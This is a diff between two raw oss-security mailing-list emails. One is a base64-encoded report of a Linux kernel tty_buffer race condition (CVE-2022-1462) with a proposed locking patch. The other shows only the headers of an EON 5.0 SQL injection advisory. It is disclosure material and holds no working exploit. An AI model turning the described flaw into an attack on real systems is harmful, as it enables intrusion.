@@ -1,4 +1,9 @@
-Received: (qmail 28659 invoked by uid 550); 27 May 2022 14:56:06 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6410" "Thursday" "23" "March" "2017" "16:21:15" "+0100" "Sydream Labs" "labs@sysdream.com" "<d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>" "230" "[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection" nil nil nil "3" "2017032315:21:15" "[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection" (number mark "U       labs@sysdrea Mar 23  230/6410  " thread-indent "\"[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 17716 invoked by uid 550); 23 Mar 2017 15:21:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,440 +12,254 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 22458 invoked from network); 27 May 2022 14:47:29 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=bFpV2rgelpbjM+sOrJdUEiI7Enn25GWvogOJdwsIiYk=;
-        b=R1pGB7hFDgMbTYthGf2jThmve84zl76Hsj1rgvucvxwZmFyq0WQNvUjNhwYzSM0cSw
-         CQENcgMiUI/vbaDvYeCCutTMbqFijNlj0YiAErfj50//XOBPl8EpsCUyfXYDtpFt745q
-         YLEjeKYuhnMfgcY6J2C2bBz4iTNzFtU1yQ9e041ejGOaYSwIXDZkyIKs46dfRyWPBJQM
-         EF9+JZHtvTEZh2OG521rMCg4Kh48kbzVHxtLNVSGEhbz9gMXExMam9oUbchS6Fe2Ybw8
-         CltDvx8CyhvxBgi/Xhzbl/Ns2Vioh8bVsZpVjBZzWXjeVvd+CoxeMU7tf7FjvV9WIMrB
-         rnhw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=bFpV2rgelpbjM+sOrJdUEiI7Enn25GWvogOJdwsIiYk=;
-        b=qD+e4p23FVTlGPs3jsTv1Rucc+tcZSLB/Roh0x8ZjiqouRvc+sR5CXnNQNQEYDYDsP
-         3f5UJcV2V30cI82ATIHmbrJikZ34nJ2nxP/dZWxoDbeiRSOrFrKePB1o4fhFHhFwt1V8
-         jU269Fux1wpijDvbwSjtJ0Lcpxa/7MEot5zB0ev4LXOZj5Sf7aNFDiV0Gbca9BHXoaP3
-         ASUjs+e7B2a7mA8cHYEoJwMXnJH37P4jwtMOZIeOA5S6AiBMPzGtTejG2CWbYcsuLaW3
-         pdZnN8c8nDdwnGsiUdgMa/6OnX87yoTaaK148kefreeekdvm3L6g/S4GacU1a5hToW1g
-         JnHQ==
-X-Gm-Message-State: AOAM532VE39+3/eMlebboO+VEzrW6VyB4s5POjdr8GdofOIuYcbBO1VZ
-	Xr1mRWAf/AxprkIcUl74ie2PK62CNxe4KNRe1JamN1EbnSC04LRdOWE=
-X-Google-Smtp-Source: ABdhPJyyezVr2yjKT5ZjKYBOjuGl5lJ5MaPeI5fXZetI+fIw7odFBiJ4kSFvkYbEsFew25Y4VwpGsnzUulCJcAUHqzM=
-X-Received: by 2002:a17:90a:6342:b0:1df:763d:4eca with SMTP id
- v2-20020a17090a634200b001df763d4ecamr8639671pjs.85.1653662836991; Fri, 27 May
- 2022 07:47:16 -0700 (PDT)
-MIME-Version: 1.0
-From: =?UTF-8?B?5LiA5Y+q54uX?= <chennbnbnb@gmail.com>
-Date: Fri, 27 May 2022 22:47:05 +0800
-Message-ID: <CAHP5YvJS6SjwTxCzsnhMbwxqmhj08xqgv-k6AfpiwBheCpJBAw@mail.gmail.com>
+Received: (qmail 17695 invoked from network); 23 Mar 2017 15:21:30 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 11D311A0D4A
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1490282477;
+	bh=TRsMdBYWBuf0o7xClFXzNjZqc7OwVFxpeNJDHAbpofc=;
+	h=From:Subject:To:Message-ID:Date:MIME-Version:Content-Type;
+	b=Gj4bvV7s+zV1Xaa62PYrCTRbtobkO3X5UC6qGs6TU3cw6s4EeQcwosbCkR44b/c4H
+	 qkpkPK//snELA8pvsU6HHCUy3rslC+XbKktDUk/2yUwPnwMcteInIalRhjdtEKWHZ/
+	 P5L9cwP54ZgzKaHo3qqnG3oJVBzNoSyrObYnnMAY=
+From: Sydream Labs <labs@sysdream.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000fa2a0905dfff61ed"
-Subject: [oss-security] CVE-2022-1462: Linux kernel: A race condition vulnerability in drivers/tty/tty_buffers.c
+Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
+Date: Thu, 23 Mar 2017 16:21:15 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.8.0
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8"
+Subject: [oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection
 
---000000000000fa2a0905dfff61ed
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: base64
+--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8
+Content-Type: multipart/mixed; boundary="84WPGhW89HW1Wh86w23BP9JWV3riVGkti";
+ protected-headers="v1"
+From: Sydream Labs <labs@sysdream.com>
+To: oss-security@lists.openwall.com
+Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
+Subject: [CVE-2017-6088] EON 5.0 Multiple SQL Injection
 
-dGhpcyB2dWxuZXJhYmlsaXR5IGNvbWVzIGZyb20gY29tbWl0KA0KaHR0cHM6
-Ly9naXRodWIuY29tL3RvcnZhbGRzL2xpbnV4L2NvbW1pdC9iNmRhMzFiMmMw
-N2M0NmYyZGNhZDFkODZjYWE4MzUyMjdhMTZkOWZmKQ0KDQp0aGlzIGNvbW1p
-dCBzdWdnZXN0IGRvIHR0eV9mbGlwX2J1ZmZlcl9wdXNoIHdpdGhvdXQgcG9y
-dC0+bG9jayBpbiBwdHlfd3JpdGUNCmJ1dCB0dHlfZmxpcF9idWZmZXJfcHVz
-aCgpIHdpbGwgd3JpdGUgY3JpdGljYWwgcmVzb3VyY2VzIGBidWYtPnRhaWwt
-PmNvbW1pdGANCnRoaXMgY2FuIGNhdXNlIHJhY2UgY29uZGl0aW9ucywgdmFs
-dWUgb2YgYGJ1Zi0+dGFpbC0+Y29tbWl0YCBtYXkgYmVjb20gbGVzcw0K4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCNYGBgYw0Kdm9pZCB0dHlfZmxp
-cF9idWZmZXJfcHVzaChzdHJ1Y3QgdHR5X3BvcnQqIHBvcnQpDQp7DQogICAg
-c3RydWN0IHR0eV9idWZoZWFkKiBidWYgPSAmcG9ydC0+YnVmOw0KICAgIHNt
-cF9zdG9yZV9yZWxlYXNlKCZidWYtPnRhaWwtPmNvbW1pdCwgYnVmLT50YWls
-LT51c2VkKTsgICAgLy9IZXJlDQogICAgcXVldWVfd29yayhzeXN0ZW1fdW5i
-b3VuZF93cSwgJmJ1Zi0+d29yayk7DQp9DQrigI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI1g
-YGANCg0KdGhlbiB0dHlfZmxpcF9idWZmZXJfcHVzaCgpIHdpbGwgY2FsbCBm
-dW5jdGlvbiBmbHVzaF90b19sZGlzYygpDQppbiBmdW5jdGlvbiBmbHVzaF90
-b19sZGlzYygpLCBjb3VudCB3aWxsIGJlY29tZSBuZWdhdGl2ZSB3aGVuDQpg
-aGVhZC0+Y29tbWl0YCBnZXQgbGVzcw0KdGhpcyB3aWxsIGxlYWQgdG8gb3V0
-LW9mLWJvdW5kLXJlYWQgYW5kIGxlYWsgc29tZSBpbmZvcm1hdGlvbiBpbiBz
-bGFiDQrigI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI1gYGBjDQpzdGF0aWMgdm9pZCBmbHVzaF90b19sZGlzYyhz
-dHJ1Y3Qgd29ya19zdHJ1Y3QqIHdvcmspDQp7DQogICAgLi4uOw0KICAgIHdo
-aWxlICgxKSB7DQogICAgICAgIHN0cnVjdCB0dHlfYnVmZmVyKiBoZWFkID0g
-YnVmLT5oZWFkOw0KICAgICAgICAuLi47DQogICAgICAgIG5leHQgPSBzbXBf
-bG9hZF9hY3F1aXJlKCZoZWFkLT5uZXh0KTsNCiAgICAgICAgY291bnQgPSBz
-bXBfbG9hZF9hY3F1aXJlKCZoZWFkLT5jb21taXQpIC0gaGVhZC0+cmVhZDsg
-ICAgICAvL0hlcmUNCiAgICAgICAgLi4uOw0KICAgICAgICBjb3VudCA9IHJl
-Y2VpdmVfYnVmKHBvcnQsIGhlYWQsIGNvdW50KTsNCiAgICAgICAgaGVhZC0+
-cmVhZCArPSBjb3VudDsNCiAgICAgICAgLi4uOw0KICAgIH0NCiAgICAuLi47
-DQp9DQrigI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI1gYGAN
-Cg0KbXkgcGF0Y2ggc3VnZ2VzdGlvbiBpcyB0aGF0OiB1c2UgbXV0ZXggbG9j
-ayB0byBwcm90ZWN0DQpgc21wX3N0b3JlX3JlbGVhc2UoJmJ1Zi0+dGFpbC0+
-Y29tbWl0LCBidWYtPnRhaWwtPnVzZWQpO2ANCnRoaXMgd29uJ3QgY2F1c2Ug
-ZGVhZGxvY2ssIGl0J3Mgc2FmZQ0K4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN
-4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCN4oCNYGBgZGlmZg0KLS0tIC4v
-dHR5X2J1ZmZlci5jLnJhdyAgMjAyMi0wNC0yNCAyMzoyMTo1NS40NTY1MTA1
-OTIgKzA4MDANCisrKyAuL3R0eV9idWZmZXIuYyAgICAgIDIwMjItMDQtMjQg
-MjM6MzM6NDcuNTY5OTg2NTk0ICswODAwDQpAQCAtNTY5LDEyICs1NjksMTUg
-QEANCiB2b2lkIHR0eV9mbGlwX2J1ZmZlcl9wdXNoKHN0cnVjdCB0dHlfcG9y
-dCAqcG9ydCkNCiB7DQogICAgICAgIHN0cnVjdCB0dHlfYnVmaGVhZCAqYnVm
-ID0gJnBvcnQtPmJ1ZjsNCisgICAgICAgdW5zaWduZWQgbG9uZyBmbGFnczsg
-ICAgLy9wYXRjaA0KDQogICAgICAgIC8qDQogICAgICAgICAqIFBhaXJlZCB3
-LyBhY3F1aXJlIGluIGZsdXNoX3RvX2xkaXNjKCk7IGVuc3VyZXMgZmx1c2hf
-dG9fbGRpc2MoKQ0Kc2Vlcw0KICAgICAgICAgKiBidWZmZXIgZGF0YS4NCiAg
-ICAgICAgICovDQorICAgICAgIHNwaW5fbG9ja19pcnFzYXZlKCZwb3J0LT5s
-b2NrLCBmbGFncyk7ICAvL3BhdGNoLCBHdWFyYW50ZWVkDQphdG9taWNpdHkg
-b2Ygd3JpdGluZyB0byBjb21taXQgdmFyaWFzDQogICAgICAgIHNtcF9zdG9y
-ZV9yZWxlYXNlKCZidWYtPnRhaWwtPmNvbW1pdCwgYnVmLT50YWlsLT51c2Vk
-KTsNCisgICAgICAgc3Bpbl91bmxvY2tfaXJxcmVzdG9yZSgmcG9ydC0+bG9j
-aywgZmxhZ3MpOyAgLy9wYXRjaA0KICAgICAgICBxdWV1ZV93b3JrKHN5c3Rl
-bV91bmJvdW5kX3dxLCAmYnVmLT53b3JrKTsNCiB9DQogRVhQT1JUX1NZTUJP
-TCh0dHlfZmxpcF9idWZmZXJfcHVzaCk7DQrigI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
